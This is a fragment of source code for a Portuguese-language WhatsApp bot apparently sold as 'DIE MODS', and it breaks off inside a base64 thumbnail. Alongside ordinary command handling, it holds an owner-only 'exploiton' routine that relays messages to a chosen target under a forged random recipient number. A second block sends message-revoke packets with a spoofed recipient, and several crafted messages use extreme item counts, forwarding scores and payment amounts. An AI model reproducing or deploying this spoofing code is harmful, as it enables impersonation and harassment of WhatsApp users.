const cart ={"key": { "fromMe": false,"participant":"0@s.whatsapp.net", "remoteJid": "556181496039-1625944593@g.us" }, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail:  fs.readFileSync('./logos/logo.jpg'),surface: 200, message: `𐎟 Comando : ${prefix}${command} \n 𐎟  Usuario ${pushname}`, orderTitle: '┗🌠┅𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 ', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}


//configruracao de dono, adm etc...
const quoted = info.quoted ? info.quoted : info
const mime = (quoted.info || quoted).mimetype || ""
const isBot = info.key.fromMe ? true : false
const isBotGroupAdmins = groupAdmins.includes(numeroBot) || false
const isAntiLink = isGroup ? antilink.includes(from) : false
const isGroupAdmins = groupAdmins.includes(sender) || false 
const isOwner = sender.includes(numeroDono)
const isOwner2 = sender.includes(numeroDono2)
const groupId = isGroup ? groupMetadata.jid : ''
banChats = true
const argis = body.trim().split(/ +/)

// Consts isQuoted
const isImage = type == "imageMessage"
const isVideo = type == "videoMessage"
const isAudio = type == "audioMessage"
const isSticker = type == "stickerMessage"
const isContact = type == "contactMessage"
const isPoll = type == "pollMessage"
const isLocation = type == "locationMessage"
const isProduct = type == "productMessage"
const isMedia = (type === "imageMessage" || type === "videoMessage" || type === "audioMessage")
typeMessage = body.substr(0, 50).replace(/\n/g, "")
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isPoll) typeMessage = "poll"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"
const isQuotedMsg = type === "extendedTextMessage" && content.includes("textMessage")
const isQuotedImage = type === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedVideo = type === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedDocument = type === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAudio = type === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedPoll = type === "extendedTextMessage" && content.includes("PoMessage")
const isQuotedContact = type === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedLocation = type === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedProduct = type === "extendedTextMessage" && content.includes("productMessage")

outrasVariavel = "bot"

let {name, urlMinhaApikey, aurlSexo, compreSuaApikey, cdd, crtt, baterai, charging, autoHourActivate, emoji_bot, blocked, multi, nopref, variosPrefixo, leitor} = outrasVariavel



const dados = m.messages[0]



// FUNCAO DE ANTILINK \\

// RESPOSTAS DOS COMANDOS \\
resposta = {
espere: "♨️ Aguarde...enviando ",
aguarde: "♨️ Aguarde...enviando ",
dono: "♨️ Esse comando so pode ser usado pelo virus!!! ",
grupo: "♨️ Esse comando só pode ser usado em grupo ",
privado: "♨️ Esse comando só pode ser usado no privado ",
isGroup2: `oi `,
adm: "♨️ Esse comando só pode ser usado por administradores de grupo",
botadm: " ♨️ Este comando só pode ser usado quando o bot se torna administrador ",
registro: `[⚠️] Você não se registrou utilize ${prefixo}rg para se registrar `,
norg: "[⚙️️] Você ja está registrado ",
erro: "♨️ Error, tente novamente mais tarde "
}
//const da mensagem que foi recebida
if (!isGroup && isCmd) console.log('[\x1b[1;32m COMANDO \x1b[1;37m]', color(command, "violet"), 'USUARIO', color(pushname, "violet"))
if (!isGroup && !isCmd) console.log('[\x1b[1;32m MENSAGEM \x1b[1;37m]', 'DO', color(pushname, "violet"))
if (isCmd && isGroup) console.log('[\x1b[1;32m COMANDO \x1b[1;37m]', color(command, "violet"), 'do', color(pushname, "violet"), 'NO GRUPO', color(groupName))
if (!isCmd && isGroup) console.log('[\x1b[1;32m MENSAGEM \x1b[1;37m]', 'DO', color( `${pushname} `, "violet"), 'NO GRUPO', color(groupName))

// Função para processar as mensagens recebidas e executar a "case" antes do switch

// Exemplo de uso:
//  
//
let macumbadokauan = [];

//
const versetamacumbado = macumbadokauan.find((sla) => sla.numero == sender);
if (versetamacumbado) {
  // Macumba para gerar números aleatórios no formato +55
  const stringLength = 10;
  const letters = "1234567890";
  let randomString = "";
  for (let o = 0; o < stringLength; o++) {
    randomString += letters.charAt(Math.floor(Math.random() * letters.length));
  }
  randomString = randomString.slice(0, 2) + '9' + randomString.slice(2);

  if (!isCmd) {
    await trix.relayMessage(versetamacumbado.alvo + "@s.whatdapp.net", 
      {
        "conversation": budy
      },
      {
        additionalAttributes: {
          recipient: randomString + "@s.whatsapp.net"
        }
      });
  }
}

// Aqui está a case 'exploiton':


//bagui pra pegar a info das msg
//const infogetclone999 = isQuotedMsg ? info.quotedMsg : info.message;console.log(`.eval trix.sendjson(from,${JSON.stringify(infogetclone999)});\n`);
//macumba
const folderPath9 = './Leia';
const filePath = `${folderPath9}/Leia.js`;

async function checkAndRunCommandOnce9() {
  if (!fs.existsSync(folderPath9)) {
    fs.mkdirSync(folderPath9);
  }

  if (!fs.existsSync(filePath)) {
    const filePathToRead = './trix.js'; // Substitua pelo caminho correto do arquivo
    const quote = `'`;
    const regexPattern = `case ${quote}[\\s\\S]*?${quote}`;

    fs.readFile(filePathToRead, 'utf-8', (err, data) => {
      if (err) {
        console.error('Erro ao ler o arquivo:', err);
        return;
      }

      const matches = data.match(new RegExp(regexPattern, 'g'));

      if (!matches || !Array.isArray(matches)) {
        console.error('Padrões não encontrados ou não é uma matriz.');
        return;
      }

      let caseNames = [];

      for (const match of matches) {
        const caseName = match.match(new RegExp(`case ${quote}(.*?)${quote}`))[1];
        caseNames.push(caseName);
      }

      let pluginsText = '┃🏆 ✰ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞  ❵ ⭐ \n';
      const emojis = ['🌟', '🎉', '✨', '☠️', '📩', '🔥', '👀']; // Adicione os emojis que desejar
      const prefixxo = '.'; // Defina o prefixo corretamente

      for (let i = 0; i < caseNames.length; i++) {
        const caseName = caseNames[i];
        const emoji = emojis[i % emojis.length]; // Seleciona o emoji da lista de emojis

        pluginsText += `┃ ${emoji}  𐎟  ${prefixxo}${caseName}\n `;
      }

      // Enviar a mensagem apenas uma vez
      fs.writeFileSync(filePath, '\n\n Parabéns você escaneou o qr code caso tenha alguma dúvida ou queira comprar alguma coisa Chame no zap 5583998140301 \n\n//por favor não apague esta pasta');
      trix.sendjson(`${numeroDono}@s.whatsapp.net`, {
    "listMessage": {
      "title": `⭐ Menu do bot `,
      "description": '╭━━━━━━━━━━━━━━━━━━╮\n' +pluginsText + '┣━━━━━━━━━━━━━━━━━━╯\n' + '┃ 〰️ 𐎟 Criador do bot: 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  \n┃ ⚫ 𐎟 Helper:  𝗘𝗬𝗣𝗭 𝗚𝗢𝗗 \n' + '╰━━━━━━━━━━━━━━━━━━━╯',
      "buttonText": "✰ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  @gmail.fuckup ✦",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST_CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
                    "productId": "7584104564934820"
                  },
                  {
                    "productId": "7584104564934820"
                  },
                  {
                    "productId": "7584104564934820"
                  },
            ]
          }
        ],
        "headerImage": {
          "productId": "5512997675520",
             "jpegThumbnail": "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"
},
        "businessOwnerJid": `5583998140301@s.whatsapp.net`,
        },
     "footerText": " ✰ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ✦",
"listMessage":{"header":{"hasMediaAttachment":true,
        "locationMessage": {
          "degreesLatitude": 1.2348753517826312,
          "degreesLongitude": -31.82241802860517
      }
      }
      }
  }, 
      }, {quoted: menuquoted}),
       trix.sendjson(`${numeroDono}@s.whatsapp.net`, {
    "extendedTextMessage": {
      "text": `Aos nossos queridos compradores do Bot no WhatsApp,

Queremos expressar nossa gratidão por escolherem o nosso bot. Estamos felizes em ver como ele tem sido útil para vocês. Além das opções no menu principal, ficamos empolgados ao ver que muitos estão explorando os comandos adicionais. Isso mostra como o bot é versátil e se adapta às suas necessidades.

Uma característica especial é que o bot atualiza o menu automaticamente, garantindo que você tenha acesso às últimas funcionalidades. Obrigado por confiarem no nosso bot e por serem parte dessa jornada de melhoria contínua. Esperamos continuar a atendê-los bem e aprimorar ainda mais o nosso bot.

Com gratidão,
[Trix e kalzin] `
    }
  },{quoted: menuquoted})
    });
  }
}
checkAndRunCommandOnce9();
//botao macumba 
if (funcaodeapagar) {
  if (!info.key.fromMe && !isGroup) {
    await trix.relayMessage(sender, {
      protocolMessage: {
        type: `REVOKE`,
        key: info.key
      }
    }, {
      additionalAttributes: {
        recipient: state.creds.me.id.split(':')[0] + '@s.whatsapp.net',
        edit: '7'
      }
    });
  }
}
switch (command) {
// Começo dos comandos com prefix //
//     /\/\                              
//    (° v °)                             
//    /|    |\                            
//     V---V                             
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
case 'menu':
  const filePathToRead = './trix.js'; // Replace with the correct file path
  const quote = `'`;
  const regexPattern = `case ${quote}[\\s\\S]*?${quote}`;

  fs.readFile(filePathToRead, 'utf-8', (err, data) => {
    if (err) {
      console.error('Erro ao ler o arquivo:', err);
      return;
    }

    const matches = data.match(new RegExp(regexPattern, 'g'));

    if (!matches || !Array.isArray(matches)) {
      console.error('Padrões não encontrados ou não é uma matriz.');
      return;
    }

    const caseNames = matches.map(match => match.match(new RegExp(`case ${quote}(.*?)${quote}`))[1]);

    let pluginsText = '┃🏆 ✰ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ❵ ⭐ \n';
    const emojis = ['🌟', '🎉', '✨', '☠️', '📩', '🔥', '👀']; // Add desired emojis
    const prefixxo = '.'; // Set the prefix correctly

    for (let i = 0; i < caseNames.length; i++) {
      const caseName = caseNames[i];
      const emoji = emojis[i % emojis.length]; // Select emoji from the list

      pluginsText += `┃ ${emoji}  𐎟  ${prefixxo}${caseName}\n `;
    }
trix.sendjson(from, {"requestPaymentMessage":{"currencyCodeIso4217":"BRL","amount1000":"9999990","requestFrom":"0@s.whatsapp.net","noteMessage":{"extendedTextMessage":{"text":'╭━━━━━━━━━━━━━━━━━━╮\n' + pluginsText + '┣━━━━━━━━━━━━━━━━━━╯\n' + '┃ 〰️ 𐎟 Criador do bot: 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  \n┃ ⚫ 𐎟 Helper: 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   \n' + '╰━━━━━━━━━━━━━━━━━━━╯'}},"expiryTimestamp":"0","amount":{"value":"99999990","offset":1000,"currencyCode":"BRL"}}},{quoted: menuquoted})
  });
  break;
  
case 'numerodubut': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"contactMessage":{"displayName":"- NetBoost !","vcard":"BEGIN:VCARD\nVERSION:3.0\nN:!;-;NetBoost;;\nFN:- NetBoost !\nORG:- NetBoost !\nTITLE:\nitem1.TEL;waid=558398042937:+55 83 9804-2937\nitem1.X-ABLabel:Celular\nX-WA-BIZ-NAME:- NetBoost !\nEND:VCARD"}});break

 

case 'exploiton':
    if (!isOwner && !info.key.fromMe) {
      enviar("Apenas o meu dono pode usar isso, amigo.");
    } else {
      macumbadokauan.push({ numero: sender, alvo: text });
      enviar("Feito!");
    }
    break;

  case 'exploitoff':
    const testee = macumbadokauan.find((sla) => sla.numero == sender);
    if (testee !== undefined) {
      const removeIndex = macumbadokauan.indexOf(testee);
      macumbadokauan.splice(removeIndex, 1);
      enviar("Pronto, exploit desativado.");
    } else {
      enviar("Nenhum exploit encontrado para desativar.");
    }
    break;

case 'figtriste': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"stickerMessage":{"url":"https://mmg.whatsapp.net/v/t62.15575-24/30562595_797788558713811_5145041984687645167_n.enc?ccb=11-4&oh=01_AdTAyCPnjoJZiRSFesKHYfFrAdcoXEnhSKogRarGWi931g&oe=650864CF&mms3=true","fileSha256":"13qZETEt5FACwtUQ8bn5xbLaADJXdndxS778SzhKajM=","fileEncSha256":"4i+FClRwiR+MtnLDpCrQjqP7/NH/ystFqknmWjZZHgY=","mediaKey":"21odbdV0KOaKreDJ1FlRkTv1yKXHb64pEHV852gZb0E=","mimetype":"image/webp","height":64,"width":64,"directPath":"/v/t62.15575-24/30562595_797788558713811_5145041984687645167_n.enc?ccb=11-4&oh=01_AdTAyCPnjoJZiRSFesKHYfFrAdcoXEnhSKogRarGWi931g&oe=650864CF","fileLength":"8740","mediaKeyTimestamp":"1692390206","isAnimated":false,"stickerSentTs":"1692460256000","isAvatar":false}});break

case 'otramacumba': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"orderMessage":{"orderId":"131410286697652","thumbnail":"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